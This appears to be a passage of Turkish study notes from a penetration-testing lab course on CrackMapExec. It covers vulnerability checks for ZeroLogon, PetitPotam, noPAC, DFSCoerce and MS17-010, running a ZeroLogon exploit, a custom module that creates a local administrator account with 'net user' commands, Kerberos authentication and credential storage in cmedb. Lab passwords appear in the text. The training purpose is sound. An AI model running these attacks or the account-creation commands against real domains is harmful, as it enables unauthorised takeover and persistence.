+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
